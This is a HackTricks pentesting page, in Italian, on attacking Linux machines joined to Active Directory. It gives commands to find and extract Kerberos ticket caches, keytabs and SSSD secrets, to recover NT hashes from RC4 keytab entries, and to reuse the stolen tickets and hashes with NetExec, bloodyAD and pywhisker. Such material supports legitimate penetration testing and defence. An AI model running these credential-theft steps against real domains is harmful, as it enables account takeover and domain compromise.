# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Una macchina linux può essere presente anche all'interno di un ambiente Active Directory.

Una macchina Linux dentro un AD può **memorizzare localmente materiale Kerberos**: user ccaches, machine/service keytabs e secret gestiti da SSSD. Questi artefatti possono di solito essere riutilizzati come qualsiasi altro Kerberos credential. Per leggere la maggior parte di essi dovrai essere il proprietario user del ticket oppure **root** sulla macchina.

## Enumeration

### AD enumeration from linux

Se hai accesso a un AD in linux (o bash in Windows) puoi provare [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) per enumerare l'AD.

Puoi anche controllare la pagina seguente per imparare **altri modi per enumerare AD da linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA è un'**alternativa** open-source a Microsoft Windows **Active Directory**, principalmente per ambienti **Unix**. Combina un completo **LDAP directory** con un MIT **Kerberos** Key Distribution Center per una gestione simile ad Active Directory. Utilizzando il Dogtag **Certificate System** per la gestione dei certificati CA & RA, supporta l'autenticazione **multi-factor**, incluse le smartcard. SSSD è integrato per i processi di autenticazione Unix. Scopri di più qui:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Prima di toccare i tickets, identifica **come l'host è stato joinato ad AD** e **dove il materiale Kerberos è davvero memorizzato**. Su moderni host Linux questo è comunemente gestito da `realmd` + `adcli` + `sssd`, non solo da file piatti in `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Questo ti dice rapidamente se l'host si fida di AD, se SSSD sta memorizzando nella cache identità o ticket, e se **machine/service keytabs** o **KCM secrets** sono disponibili per l'abuso.

## Playing with tickets

### Pass The Ticket

In questa pagina troverai diversi punti in cui potresti **trovare kerberos tickets all'interno di un host linux**; nella pagina seguente puoi imparare come trasformare questi formati di ticket CCache in Kirbi (il formato che devi usare in Windows) e anche come eseguire un attacco PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Se vuoi i flussi di lavoro specifici per Linux per il recupero dei ticket (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, ecc.), consulta la pagina dedicata:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Riutilizzo dei ticket CCACHE da /tmp

I file CCACHE sono formati binari per **memorizzare Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` è ancora comune, ma le moderne distribuzioni Linux usano anche `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` o `KCM:%{uid}`. Controlla la variabile di ambiente **`KRB5CCNAME`** e l'impostazione `default_ccache_name` prima di assumere che i ticket risiedano in `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Riutilizzo del ticket CCACHE dal keyring

**I ticket Kerberos memorizzati nella memoria di un processo possono essere estratti**, in particolare quando la protezione ptrace della macchina è disabilitata (`/proc/sys/kernel/yama/ptrace_scope`). Uno strumento utile per questo scopo si trova su [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), che facilita l'estrazione iniettandosi nelle sessioni e scaricando i ticket in `/tmp`.

Per configurare e usare questo strumento, vengono seguiti i passaggi seguenti:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Questa procedura tenterà di iniettarsi in varie sessioni, indicando il successo memorizzando i ticket estratti in `/tmp` con una convenzione di denominazione di `__krb_UID.ccache`.

### Riutilizzo del ticket CCACHE da SSSD KCM

SSSD mantiene una copia del database nel percorso `/var/lib/sss/secrets/secrets.ldb`. La chiave corrispondente è memorizzata come file nascosto nel percorso `/var/lib/sss/secrets/.secrets.mkey`. Per impostazione predefinita, la chiave è leggibile solo se si hanno permessi di **root**.

Invocare **`SSSDKCMExtractor`** con i parametri --database e --key analizzerà il database e **decrypterà i secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Il **blob Kerberos della credential cache può essere convertito in un file Kerberos CCache** utilizzabile, che può essere passato a Mimikatz/Rubeus.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Estrai account da /etc/krb5.keytab

Le chiavi degli account di servizio, essenziali per i servizi che operano con privilegi di root, sono archiviate in modo sicuro nei file **`/etc/krb5.keytab`**. Queste chiavi, simili alle password per i servizi, richiedono una stretta riservatezza.

Per ispezionare il contenuto del file keytab, si può usare **`klist`**. Su Linux, `klist -k -K -e` stampa i principal, i numeri di versione delle chiavi, i tipi di crittografia e il materiale grezzo della chiave. Se il tipo di chiave è **23 / RC4-HMAC**, il valore della chiave è anche l'**NT hash** di quel principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Per gli utenti Linux, **`KeyTabExtract`** offre la funzionalità per estrarre l'hash RC4 HMAC, che può essere sfruttato per il riutilizzo dell'hash NTLM. Nota che questo è utile solo quando il keytab contiene ancora materiale **etype 23 / RC4-HMAC**. In ambienti **solo AES** potresti non ottenere un NT hash riutilizzabile, ma puoi comunque autenticarti direttamente con il keytab tramite Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Su macOS, **`bifrost`** funge da strumento per l'analisi dei file keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizzando le informazioni dell’account e dell’hash estratte, è possibile stabilire connessioni ai server usando strumenti come **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Riutilizzare l'account macchina da `/etc/krb5.keytab`

Su sistemi uniti con `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` di solito contiene l'**account computer** e uno o più **host/service principals**. Se hai **root**, non limitarmente a dumpare il file: usa uno dei principals elencati da `klist -k` per richiedere un TGT e operare come l'host Linux stesso.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Questo è particolarmente utile quando l'**oggetto computer** stesso ha diritti delegati in AD o quando l'host è autorizzato a recuperare altri segreti come un **gMSA**.

### Riutilizzare materiale Kerberos rubato con strumenti AD Linux-first

Una volta che hai un `ccache` valido o un keytab utilizzabile, puoi operare contro AD **direttamente da Linux** senza convertire prima tutto nei formati Windows. Molti strumenti moderni accettano nativamente `KRB5CCNAME` / l'autenticazione Kerberos:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Questo è un buon ponte tra **Linux post-exploitation** e **AD object abuse**. Per i percorsi di abuse a livello di oggetto, consulta:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefatti Linux gMSA / Managed Service Account

Le recenti distribuzioni Linux possono usare direttamente da AD i **Managed Service Accounts**. In pratica, questo significa che, dopo aver compromesso un server Linux, potresti trovare non solo il keytab dell'host ma anche **service-specific keytabs** generati da un gMSA. I posti comuni da controllare sono `/etc/gmsad.conf`, file di config specifici della deployment e ulteriori file `*.keytab` sotto `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Questo ti fornisce un'identità Kerberos riutilizzabile per gli SPN associati a quella gMSA **senza toccare alcun endpoint Windows**. Per l'abuso di gMSA/dMSA **dal lato del domain**, dopo privilegi più elevati in AD, consulta:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
